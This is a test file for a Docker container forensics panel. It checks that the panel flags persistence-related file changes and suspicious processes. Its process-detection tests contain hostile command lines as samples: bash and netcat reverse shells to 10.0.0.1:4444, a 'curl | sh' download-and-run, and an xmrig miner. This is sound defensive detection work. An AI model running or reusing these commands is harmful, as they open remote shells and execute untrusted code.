import { readFileSync } from "node:fs";

import { renderToStaticMarkup } from "react-dom/server";
import { describe, expect, it, vi } from "vitest";

import {
  dockerProcessColumn,
  isDockerContainerChanges,
  isDockerContainerProcesses,
  MAX_DOCKER_CHANGES,
} from "../shared/docker-forensics-contract";
import { changeAttention, DockerForensicsPanel, processAttention } from "./DockerForensicsPanel";

describe("what a container changed, and which changes to read first", () => {
  it("points at the places a foothold is kept, and says why", () => {
    expect(changeAttention("/etc/ld.so.preload", "added")).toContain("劫持");
    expect(changeAttention("/etc/passwd", "changed")).toBe("账号与权限配置");
    expect(changeAttention("/etc/sudoers.d/90-x", "added")).toBe("账号与权限配置");
    expect(changeAttention("/root/.ssh/authorized_keys", "added")).toBe("SSH 登录凭据");
    expect(changeAttention("/etc/cron.d/persist", "added")).toContain("计划任务");
    expect(changeAttention("/var/spool/cron/crontabs/root", "changed")).toContain("计划任务");
    expect(changeAttention("/root/.bashrc", "changed")).toContain("登录或启动");
    expect(changeAttention("/tmp/.x/miner", "added")).toContain("临时目录");
    expect(changeAttention("/dev/shm/payload", "added")).toContain("临时目录");
    expect(changeAttention("/usr/bin/ps", "changed")).toBe("可执行程序目录");
    expect(changeAttention("/var/log/auth.log", "deleted")).toBe("被删除的日志");
  });

  it("does not flag ordinary churn", () => {
    for (const path of ["/var/cache/apk/x", "/run/nginx.pid", "/var/lib/app/data.db", "/etc"]) {
      expect(changeAttention(path, "changed"), path).toBeNull();
    }
    // A cleaned-up temp file is not a dropped one.
    expect(changeAttention("/tmp/build.log", "deleted")).toBeNull();
  });
});

describe("which processes to read first", () => {
  it("names the trait it saw, not a verdict", () => {
    expect(processAttention("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1")).toContain("反弹 shell");
    expect(processAttention("nc 10.0.0.1 4444 -e /bin/sh")).toContain("反弹 shell");
    expect(processAttention("sh -c curl -fsSL http://x/s.sh | sh")).toContain("下载后直接");
    expect(processAttention("/opt/xmrig --donate-level 1")).toContain("挖矿");
    expect(processAttention("/tmp/.x/kworker")).toBe("从临时目录运行");
    for (const ordinary of ["nginx: master process nginx -g daemon off;", "sleep infinity", "/usr/bin/redis-server *:6379", "ncdu /var"]) {
      expect(processAttention(ordinary), ordinary).toBeNull();
    }
  });

  it("finds the command column in either runtime's layout", () => {
    expect(dockerProcessColumn(["UID", "PID", "PPID", "C", "STIME", "TTY", "TIME", "CMD"], "CMD", "COMMAND")).toBe(7);
    expect(dockerProcessColumn(["USER", "PID", "PPID", "%CPU", "ELAPSED", "TTY", "TIME", "COMMAND"], "CMD", "COMMAND")).toBe(7);
    expect(dockerProcessColumn(["PID"], "CMD", "COMMAND")).toBe(-1);
  });
});

describe("the forensics contract", () => {
  it("takes exactly the backend's shapes", () => {
    const changes = {
      snapshotHandle: "s", containerHandle: "c",
      items: [{ kind: "added", path: "/tmp/x" }], truncated: false, unreadableLines: 0,
    };
    expect(isDockerContainerChanges(changes)).toBe(true);
    expect(isDockerContainerChanges({ ...changes, items: [{ kind: "moved", path: "/tmp/x" }] })).toBe(false);
    expect(isDockerContainerChanges({ ...changes, items: [{ kind: "added", path: "tmp/x" }] })).toBe(false);
    expect(isDockerContainerChanges({ ...changes, unreadableLines: -1 })).toBe(false);
    expect(isDockerContainerChanges({
      ...changes,
      items: Array.from({ length: MAX_DOCKER_CHANGES + 1 }, () => ({ kind: "added", path: "/x" })),
    })).toBe(false);

    const processes = { snapshotHandle: "s", containerHandle: "c", titles: ["PID", "CMD"], rows: [["1", "sleep"]], truncated: false };
    expect(isDockerContainerProcesses(processes)).toBe(true);
    // Every row has exactly the header's columns.
    expect(isDockerContainerProcesses({ ...processes, rows: [["1"]] })).toBe(false);
    expect(isDockerContainerProcesses({ ...processes, titles: [] })).toBe(false);
    expect(isDockerContainerProcesses({ ...processes, extra: true })).toBe(false);
  });
});

describe("the panel before anything is read", () => {
  const api = { getDockerContainerChanges: vi.fn(async () => ({})), getDockerContainerProcesses: vi.fn(async () => ({})) };

  it("reads nothing until asked, and says what each answer does not cover", () => {
    const html = renderToStaticMarkup(
      <DockerForensicsPanel api={api} bindingHandle="b" snapshotHandle="s" containerHandle="c" running />,
    );
    expect(html).toContain("读取改动");
    expect(html).toContain("读取进程");
    expect(html).toContain("挂载的卷和绑定目录里的文件不在其中");
    expect(html).toContain("不依赖容器里的 ps");
    expect(api.getDockerContainerChanges).not.toHaveBeenCalled();
  });

  it("offers processes only for a running container", () => {
    const html = renderToStaticMarkup(
      <DockerForensicsPanel api={api} bindingHandle="b" snapshotHandle="s" containerHandle="c" running={false} />,
    );
    expect(html.match(/<button[^>]*data-testid="docker-forensics-processes"[^>]*>/u)?.[0]).toContain("disabled");
    expect(html.match(/<button[^>]*data-testid="docker-forensics-changes"[^>]*>/u)?.[0]).not.toContain("disabled");
  });

  it("uses only theme tokens for the panel's colours", () => {
    const css = readFileSync(new URL("./docker-page.css", import.meta.url), "utf8");
    const panel = css.slice(css.indexOf("/* --- 排查"));
    expect(panel.length).toBeGreaterThan(500);
    expect(panel).not.toMatch(/#[0-9a-f]{3,8}\b|rgba?\(|hsla?\(/iu);
  });
});
